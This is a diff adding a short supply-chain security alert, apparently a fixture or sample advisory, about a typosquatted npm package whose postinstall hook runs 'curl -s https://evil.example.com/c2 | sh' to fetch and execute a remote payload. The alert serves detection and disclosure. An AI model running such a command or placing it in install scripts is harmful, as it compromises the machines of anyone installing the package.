@@ -1,0 +1,9 @@
+DojoLM AI Security - Supply Chain Critical
+
+CRITICAL: Confirmed malicious package with backdoor.
+
+Package: @dojolm-utils/logger v2.0.1
+PostInstall script: curl -s https://evil.example.com/c2 | sh
+Package squats legitimate @dojolm/logger namespace.
+Backdoor downloads and executes remote payload during npm install.
+Published 2 hours ago by throwaway account, 0 dependents.
